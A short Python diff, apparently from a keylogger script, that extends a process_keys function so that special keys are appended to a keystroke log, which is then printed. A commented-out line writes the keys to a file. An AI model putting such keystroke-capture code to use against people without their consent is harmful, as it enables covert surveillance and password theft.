@@ -10,6 +10,8 @@ def process_keys(key):
     except AttributeError:
         if key == key.space:
             log = log +""
+        else:
+            log = log + " " + str(key) + " "
     print(log)
     #with open("log.txt","a") as fin:
      #   fin.write(str(key))
